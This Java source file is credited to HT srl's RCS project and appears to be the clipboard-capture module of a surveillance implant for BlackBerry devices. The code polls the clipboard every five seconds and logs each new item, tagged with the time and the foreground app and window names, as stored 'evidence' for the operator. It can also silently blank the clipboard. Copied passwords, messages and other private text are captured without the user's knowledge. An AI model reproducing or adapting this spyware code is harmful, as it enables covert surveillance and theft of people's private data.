//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.agent
 * File         : ClipBoardAgent.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry.module;

import java.util.Vector;

import net.rim.device.api.system.Clipboard;
import blackberry.config.ConfModule;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.evidence.Evidence;
import blackberry.evidence.EvidenceType;
import blackberry.interfaces.UserAgent;
import blackberry.manager.ModuleManager;
import blackberry.utils.DateTime;
import blackberry.utils.Utils;
import blackberry.utils.WChar;

/**
 * The Class ClipBoardAgent.
 */
public final class ModuleClipboard extends BaseModule implements UserAgent {
    //#ifdef DEBUG
    static Debug debug = new Debug("ModClipboard", DebugLevel.VERBOSE);
    //#endif

    static String lastClip = "";

    private boolean clipSuspended;

    public static String getStaticType() {
        return "clipboard";
    }

    public static ModuleClipboard getInstance() {
        return (ModuleClipboard) ModuleManager.getInstance().get(
                getStaticType());
    }

    public boolean parse(ConfModule conf) {
        setPeriod(5000);
        return true;
    }
    

    public void actualStart() {
        //#ifdef DEBUG
        debug.trace("actualStart");
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    public synchronized void actualGo() {
        if(clipSuspended){
            return;
        }
        String clip = (String) Clipboard.getClipboard().get();
        if (clip != null) {
            if (!clip.equals(lastClip)) {
                //#ifdef DEBUG
                debug.trace("actualRun: captured " + clip);
                //#endif
                saveEvidence(clip);
                lastClip = clip;
            }
        }
    }


    public void actualStop() {
        //#ifdef DEBUG
        debug.trace("actualStop");
        //#endif
    }

    public synchronized void setClip(String clip) {
        //#ifdef DEBUG
        debug.trace("setClip: " + clip);
        //#endif
        lastClip = clip;
         try{
            Clipboard.getClipboard().put(null);
        }catch(Exception ex){
            //#ifdef DEBUG
            debug.error(ex);
            debug.error("setClip, empty clip");
            //#endif
        }
        clipSuspended = false;
    }

    private void saveEvidence(String ret) {

        final byte[] tm = (new DateTime()).getStructTm();
        final byte[] payload = WChar.getBytes(ret.toString(), true);
        final byte[] process = WChar.getBytes(status.getCurrentForegroundAppMod(), true); //$NON-NLS-1$
        final byte[] window = WChar.getBytes(status.getCurrentForegroundAppName(), true); //$NON-NLS-1$

        final Vector items = new Vector();
        items.addElement(tm);
        items.addElement(process);
        items.addElement(window);
        items.addElement(payload);
        items.addElement(Utils.intToByteArray(Evidence.E_DELIMITER));

        Evidence evidence = new Evidence(EvidenceType.CLIPBOARD);
        evidence.atomicWriteOnce(items);

    }

    synchronized public void suspendClip() {
        clipSuspended = true;
    }

    synchronized public void resumeClip() {
        clipSuspended = false;
    }
}
